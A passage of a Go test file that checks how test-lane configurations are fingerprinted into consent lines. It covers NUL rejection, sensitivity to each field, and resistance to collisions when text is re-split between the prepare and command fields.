					}
					seen[line] = key
					pairs++
				}
			}
		}
	}
	if pairs < 100 {
		t.Fatalf("only %d grantable lanes were compared — the assertion is close to vacuous", pairs)
	}
}

// TestNULInATemplateFieldYieldsTheEmptyLine: a NUL is what makes every frame
// unforgeable, and that only holds while no field can carry one. A lane whose
// template contains a NUL is unrunnable anyway — an argv element is
// NUL-terminated — so binding consent to it would bind to something that can
// never run.
func TestNULInATemplateFieldYieldsTheEmptyLine(t *testing.T) {
	for _, tc := range []struct {
		name string
		lane project.TestLane
	}{
		{"template", project.TestLane{Name: "l", Command: "cargo test", SelectorTemplate: "--package\x00{path}"}},
		{"join", project.TestLane{Name: "l", Command: "ctest", SelectorTemplate: "-R {paths}", SelectorJoin: "\x00"}},
	} {
		t.Run(tc.name, func(t *testing.T) {
			if got := laneConsentLine(tc.lane); got != "" {
				t.Errorf("a NUL in %s produced a framed line %q, want the empty line", tc.name, got)
			}
		})
	}
}

// TestAllThreeBoundFieldsFingerprintDistinctly: command, prepare and template
// are length-framed together, so dropping any ONE of the three must move the
// line. A naive join survives every single-field test and fails here, because
// it is the shape that lets two fields re-split and keep a grant issued for
// neither.
func TestAllThreeBoundFieldsFingerprintDistinctly(t *testing.T) {
	full := templateLane()
	full.SelectorJoin = "|"
	full.SelectorTemplate = "-R {paths}"

	base := laneConsentLine(full)
	if base == "" {
		t.Fatal("the fully-populated lane produced no consent line")
	}
	for _, tc := range []struct {
		name string
		lane project.TestLane
	}{
		{"no command", func() project.TestLane { l := full; l.Command = ""; return l }()},
		{"no prepare", func() project.TestLane { l := full; l.Prepare = ""; return l }()},
		{"no template", func() project.TestLane { l := full; l.SelectorTemplate = ""; return l }()},
		{"no join", func() project.TestLane { l := full; l.SelectorJoin = ""; return l }()},
	} {
		t.Run(tc.name, func(t *testing.T) {
			if got := laneConsentLine(tc.lane); got == base {
				t.Errorf("dropping %s left the consent line unmoved", tc.name)
			}
		})
	}

	// Re-splitting the two command lines across their fields must not collide:
	// {prepare:"a", command:"bc"} and {prepare:"ab", command:"c"} concatenate
	// identically and length-frame differently.
	split1 := project.TestLane{Name: "l", Prepare: "a", Command: "bc", SelectorTemplate: "{path}"}
	split2 := project.TestLane{Name: "l", Prepare: "ab", Command: "c", SelectorTemplate: "{path}"}
	if laneConsentLine(split1) == laneConsentLine(split2) {
		t.Error("a lane re-split across prepare and command kept the same consent line")
	}
}
